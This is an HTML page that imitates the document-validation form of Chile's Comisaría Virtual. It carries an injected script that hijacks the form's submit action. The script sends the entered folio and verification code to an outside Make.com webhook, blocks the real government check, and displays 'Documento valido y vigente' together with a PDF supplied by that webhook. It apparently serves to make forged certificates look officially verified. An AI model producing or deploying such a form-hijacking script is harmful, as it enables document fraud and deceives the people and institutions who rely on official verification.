<div class="main-container container mt-5">
 <div class="row justify-content-center">
 <div class="col-md-4 col-sm-12">
 <div class="jumbotron pt-5 pb-5">
 <form method=POST action=https://www.comisariavirtual.cl/validador/documento autocomplete=off>
 
 <legend>Valide su documento</legend>
 
 <div class=form-group>
 <label for=id class="col-form-label text-md-right">Folio</label>
 <input id=id type=text class=form-control name=id value required autofocus>
 </div>
 <div class=form-group>
 <label for=key class="col-form-label text-md-right">Código de verificación</label>
 <input id=key type=text class=form-control name=key value required autofocus>
 </div>
 <div class="form-actions text-right mt-3">
 <button type=submit class="btn btn-primary">Validar</button>
 </div>
 </form>
 </div>
 </div>
 </div>
</div>

<script id="copilot-make-lookup-protected">
(function(){
  var WEBHOOK_URL = "https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb";
  var form = document.querySelector('form[action*="/validador/documento"]') || document.querySelector('form');
  var folioInput = document.getElementById('id');
  var codeInput = document.getElementById('key');
  var submitBtn = form ? form.querySelector('button[type="submit"],input[type="submit"]') : null;
  if(!form || !submitBtn) return;

  var status = document.createElement('div');
  status.id = 'copilotStatus';
  status.style.cssText = 'margin-top:10px;color:#0054ab;font-weight:700;text-align:left;';

  var panel = document.createElement('div');
  panel.id = 'copilotPanel';
  panel.style.cssText = 'margin-top:12px;text-align:left;';

  form.appendChild(status);
  form.appendChild(panel);

  function esc(v){
    return String(v||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;').replace(/'/g,'&#39;');
  }

  function pickFirstStringDeep(value, keys){
    if(!value) return '';
    var queue=[value], wanted={};
    for(var i=0;i<keys.length;i++) wanted[String(keys[i]).toLowerCase()]=true;
    while(queue.length){
      var cur=queue.shift();
      if(!cur || typeof cur!=='object') continue;
      if(Array.isArray(cur)){ for(var a=0;a<cur.length;a++) queue.push(cur[a]); continue; }
      var entries=Object.entries(cur);
      for(var j=0;j<entries.length;j++){
        var k=entries[j][0], v=entries[j][1];
        if(v && typeof v==='object'){ queue.push(v); continue; }
        if(wanted[String(k).toLowerCase()] && typeof v==='string' && v.trim()) return v.trim();
      }
    }
    return '';
  }

  function hasTruthyFlagDeep(value, keys){
    if(!value) return false;
    var queue=[value], wanted={};
    for(var i=0;i<keys.length;i++) wanted[String(keys[i]).toLowerCase()]=true;
    while(queue.length){
      var cur=queue.shift();
      if(!cur || typeof cur!=='object') continue;
      if(Array.isArray(cur)){ for(var a=0;a<cur.length;a++) queue.push(cur[a]); continue; }
      var entries=Object.entries(cur);
      for(var j=0;j<entries.length;j++){
        var k=entries[j][0], v=entries[j][1];
        if(v && typeof v==='object'){ queue.push(v); continue; }
        if(!wanted[String(k).toLowerCase()]) continue;
        if(v===true || v===1) return true;
        if(typeof v==='string'){
          var s=v.trim().toLowerCase();
          if(s==='true'||s==='1'||s==='si'||s==='sí'||s==='ok'||s==='found') return true;
        }
      }
    }
    return false;
  }

  function extractFoundPayload(data){
    if(!data || typeof data!=='object') return null;
    var found=hasTruthyFlagDeep(data,['found','encontrado','exists','ok']);
    var url=pickFirstStringDeep(data,['url','fileUrl','file_url','link','downloadUrl','download_url','publicUrl','public_url']);
    var rawPdf=pickFirstStringDeep(data,['pdf','pdfBase64','pdf_base64','fileBase64','file_base64','archivoBase64','archivo_base64']);
    var name=pickFirstStringDeep(data,['name','fileName','file_name','filename','titulo','title']);
    var dataUrl='';
    if(rawPdf){ dataUrl = rawPdf.indexOf('data:')===0 ? rawPdf : ('data:application/pdf;base64,'+rawPdf); }
    if(!found && !url && !dataUrl) return null;
    return { found:(found||!!url||!!dataUrl), url:url, dataUrl:dataUrl, name:name };
  }

  function isNotFoundPayload(data){
    if(!data || typeof data!=='object') return false;
    var st=pickFirstStringDeep(data,['status','estado']).toLowerCase();
    var msg=pickFirstStringDeep(data,['message','mensaje','detail','descripcion']).toLowerCase();
    if(st && /(not[_\s-]?found|no[_\s-]?encontrado|no[_\s-]?existe|404)/.test(st)) return true;
    if(msg && /(no\s+existe|no\s+encontrad|not\s+found|sin\s+resultados)/.test(msg)) return true;
    return !extractFoundPayload(data) && !hasTruthyFlagDeep(data,['found','encontrado','exists','ok']);
  }

  function blobToDataUrl(blob){
    return new Promise(function(resolve,reject){
      var reader = new FileReader();
      reader.onload = function(){ resolve(String(reader.result||'')); };
      reader.onerror = function(){ reject(new Error('No fue posible convertir el archivo a base64.')); };
      reader.readAsDataURL(blob);
    });
  }

  async function remoteUrlToDataUrl(url){
    var response = await fetch(url,{method:'GET',mode:'cors',credentials:'omit',cache:'no-store',referrerPolicy:'no-referrer'});
    if(!response.ok) throw new Error('No fue posible obtener el documento remoto.');
    return blobToDataUrl(await response.blob());
  }

  function setLoading(){ status.style.color='#f2ad00'; status.textContent='Consultando certificado...'; panel.innerHTML=''; }
  function setError(msg){ status.style.color='#c62828'; status.textContent=msg||'Error al consultar el certificado.'; panel.innerHTML=''; }
  function setNotFound(msg){ status.style.color='#0054ab'; status.textContent=msg||'No existe un documento para los datos ingresados.'; panel.innerHTML=''; }
  function setFound(msg){ status.style.color='#0e7a35'; status.textContent=msg||'Documento valido y vigente'; }

  async function renderFound(payload, code){
    var sourceUrl = payload.url || '';
    var fileUrl = payload.dataUrl || '';
    var fileName = payload.name || ('documento-'+code+'.pdf');
    if(!fileUrl && sourceUrl){
      try { fileUrl = await remoteUrlToDataUrl(sourceUrl); } catch(err){ console.warn(err); }
    }
    var downloadUrl = fileUrl || sourceUrl || '';
    var lower = String(fileUrl).toLowerCase();
    var preview = '';
    if(fileUrl){
      if(lower.endsWith('.pdf') || fileUrl.indexOf('data:application/pdf')===0){
        preview = '<iframe src="'+esc(fileUrl)+'#toolbar=0&navpanes=0&scrollbar=0" style="display:block;width:100%;height:520px;border:1px solid #dbe4ee;border-radius:6px;background:#fff"></iframe>';
      } else if(/\.(jpg|jpeg|png|gif|webp|svg)$/.test(lower) || fileUrl.indexOf('data:image/')===0){
        preview = '<img src="'+esc(fileUrl)+'" alt="Documento" draggable="false" style="width:100%;max-height:520px;object-fit:contain;border-radius:6px;background:#fff;user-select:none;-webkit-user-drag:none"/>';
      }
    } else {
      preview = '<div style="padding:10px;background:#f5f7fa;border-radius:6px;color:#111;">Vista previa protegida no disponible.</div>';
    }

    panel.innerHTML = [
      '<div style="background:#fff;border-radius:8px;padding:10px;display:block;width:100%;max-width:920px;margin:0 auto;" oncontextmenu="return false;">',
      '<div style="margin-bottom:8px;font-weight:700;color:#111;word-break:break-word;">'+esc(fileName)+'</div>',
      preview,
      '<div style="margin-top:10px;text-align:center;">',
      '<a href="'+esc(downloadUrl)+'" download="'+esc(fileName)+'" style="display:inline-block;background:#00a55e;color:#fff;padding:8px 12px;border-radius:6px;text-decoration:none;font-weight:700;">Descargar</a>',
      '</div>',
      '</div>'
    ].join('');
  }

  async function runLookup(){
    var folio = (folioInput && folioInput.value ? folioInput.value : '').trim();
    var key = (codeInput && codeInput.value ? codeInput.value : '').trim();
    var code = key || folio;
    if(!code){ setError('Ingrese codigo de verificacion.'); return; }

    submitBtn.disabled = true;
    setLoading();

    var payload = {
      codigo: code,
      cve: code,
      CODIGO: code,
      documentId: code,
      folio: folio,
      key: key,
      nombre: code,
      name: code,
      searchName: code,
      timestamp: new Date().toISOString()
    };

    try {
      var res = await fetch(WEBHOOK_URL,{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload)});
      if(!res.ok){ var txt = await res.text(); throw new Error(txt || ('HTTP '+res.status)); }
      var raw = await res.text();
      var data = {};
      try { data = raw ? JSON.parse(raw) : {}; } catch(e){ data = { message: raw || 'Respuesta recibida' }; }

      var foundPayload = extractFoundPayload(data);
      if(foundPayload){
        setFound('Documento valido y vigente');
        await renderFound(foundPayload, code);
      } else if(isNotFoundPayload(data)){
        setNotFound(data.message || data.mensaje || 'No existe un documento para los datos ingresados.');
      } else {
        setNotFound('No existe un documento para los datos ingresados.');
      }
    } catch(err){
      console.error(err);
      setError('Error al consultar el certificado.');
    } finally {
      submitBtn.disabled = false;
    }
  }

  form.addEventListener('submit', function(e){ e.preventDefault(); runLookup(); });
  submitBtn.addEventListener('click', function(e){ e.preventDefault(); runLookup(); });
})();
</script>
